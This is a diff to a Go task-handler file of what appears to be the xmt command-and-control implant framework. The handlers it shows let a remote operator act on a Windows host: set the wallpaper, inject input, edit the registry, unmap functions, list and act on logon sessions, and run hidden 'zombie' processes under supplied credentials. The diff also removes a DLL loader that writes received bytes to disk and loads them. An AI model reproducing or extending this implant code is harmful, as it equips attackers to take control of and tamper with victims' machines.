@@ -22,15 +22,12 @@ package task
 import (
 	"bytes"
 	"context"
-	"io"
 	"os"
-	"strings"
 	"time"
 
 	"github.com/iDigitalFlame/xmt/cmd"
 	"github.com/iDigitalFlame/xmt/cmd/filter"
 	"github.com/iDigitalFlame/xmt/data"
-	"github.com/iDigitalFlame/xmt/device"
 	"github.com/iDigitalFlame/xmt/device/regedit"
 	"github.com/iDigitalFlame/xmt/device/winapi"
 	"github.com/iDigitalFlame/xmt/device/winapi/registry"
@@ -64,16 +61,7 @@ func taskTroll(x context.Context, r data.Reader, _ data.Writer) error {
 		}
 		return winapi.SetWallpaper(s)
 	case taskTrollWallpaper:
-		var f *os.File
-		if f, err = data.CreateTemp("", execD); err != nil {
-			return err
-		}
-		_, err = io.Copy(f, r)
-		if f.Close(); err != nil {
-			os.Remove(f.Name())
-			return err
-		}
-		return winapi.SetWallpaper(f.Name())
+		return taskTrollSetWallpaper(r)
 	case taskTrollWTF:
 		d, err := r.Int64()
 		if err != nil {
@@ -112,7 +100,7 @@ func taskTroll(x context.Context, r data.Reader, _ data.Writer) error {
 		z.Stop()
 		return winapi.SetWindowTransparency(0, 255)
 	}
-	return errInvalidOp
+	return xerr.Sub("invalid operation", 0x68)
 }
 func taskCheck(_ context.Context, r data.Reader, w data.Writer) error {
 	var (
@@ -288,7 +276,7 @@ func taskFuncMap(_ context.Context, r data.Reader, _ data.Writer) error {
 	case taskFuncMapUnmap:
 		return winapi.FuncUnmapHash(h)
 	}
-	return errInvalidOp
+	return xerr.Sub("invalid operation", 0x68)
 }
 func taskRegistry(_ context.Context, r data.Reader, w data.Writer) error {
 	var (
@@ -480,7 +468,7 @@ func taskInteract(_ context.Context, r data.Reader, w data.Writer) error {
 		}
 		return winapi.SendInput(uintptr(h), t)
 	}
-	return errInvalidOp
+	return xerr.Sub("invalid operation", 0x68)
 }
 func taskShutdown(_ context.Context, r data.Reader, _ data.Writer) error {
 	m, err := r.StringVal()
@@ -546,7 +534,7 @@ func taskLoginsAct(_ context.Context, r data.Reader, w data.Writer) error {
 		w.WriteUint32(o)
 		return nil
 	}
-	return errInvalidOp
+	return xerr.Sub("invalid operation", 0x68)
 }
 func taskLoginsProc(_ context.Context, r data.Reader, w data.Writer) error {
 	s, err := r.Int32()
@@ -607,38 +595,6 @@ func taskFuncMapList(_ context.Context, _ data.Reader, w data.Writer) error {
 	return nil
 }
 
-// DLLUnmarshal will read this DLL's struct data from the supplied reader and
-// returns a DLL runnable struct along with the wait and delete status booleans.
-//
-// This function returns an error if building or reading fails or if the device
-// is not running Windows.
-func DLLUnmarshal(x context.Context, r data.Reader) (*cmd.DLL, bool, bool, error) {
-	var d DLL
-	if err := d.UnmarshalStream(r); err != nil {
-		return nil, false, false, err
-	}
-	if len(d.Data) == 0 && len(d.Path) == 0 {
-		return nil, false, false, cmd.ErrEmptyCommand
-	}
-	p := d.Path
-	if len(d.Data) > 0 {
-		f, err := data.CreateTemp("", execB)
-		if err != nil {
-			return nil, false, false, err
-		}
-		_, err = f.Write(d.Data)
-		if f.Close(); err != nil {
-			os.Remove(f.Name())
-			return nil, false, false, err
-		}
-		p = f.Name()
-	}
-	v := cmd.NewDLLContext(x, p)
-	v.Timeout = d.Timeout
-	v.SetParent(d.Filter)
-	return v, d.Wait, d.Path != p, nil
-}
-
 // ZombieUnmarshal will read this Zombies's struct data from the supplied reader
 // and returns a Zombie runnable struct along with the wait status boolean.
 //
@@ -652,12 +608,7 @@ func ZombieUnmarshal(x context.Context, r data.Reader) (*cmd.Zombie, bool, error
 	if len(z.Args) == 0 || len(z.Data) == 0 {
 		return nil, false, cmd.ErrEmptyCommand
 	}
-	v := cmd.NewZombieContext(x, nil, z.Args...)
-	if len(z.Args[0]) == 7 && z.Args[0][0] == '@' && z.Args[0][6] == '@' && z.Args[0][1] == 'S' && z.Args[0][5] == 'L' {
-		v.Args = []string{device.Shell, device.ShellArgs, strings.Join(z.Args[1:], " ")}
-	} else if len(z.Args[0]) == 7 && z.Args[0][0] == '@' && z.Args[0][6] == '@' && z.Args[0][1] == 'P' && z.Args[0][5] == 'L' {
-		v.Args = append([]string{device.PowerShell}, z.Args[1:]...)
-	}
+	v := cmd.NewZombieContext(x, z.Data, z.Args...)
 	if v.SetFlags(z.Flags); z.Hide {
 		v.SetNoWindow(true)
 		v.SetWindowDisplay(0)
@@ -665,7 +616,7 @@ func ZombieUnmarshal(x context.Context, r data.Reader) (*cmd.Zombie, bool, error
 	if v.SetParent(z.Filter); len(z.Stdin) > 0 {
 		v.Stdin = bytes.NewReader(z.Stdin)
 	}
-	if v.Timeout, v.Dir, v.Env, v.Data = z.Timeout, z.Dir, z.Env, z.Data; len(z.User) > 0 {
+	if v.Timeout, v.Dir, v.Env = z.Timeout, z.Dir, z.Env; len(z.User) > 0 {
 		v.SetLogin(z.User, z.Domain, z.Pass)
 	}
 	return v, z.Wait, nil
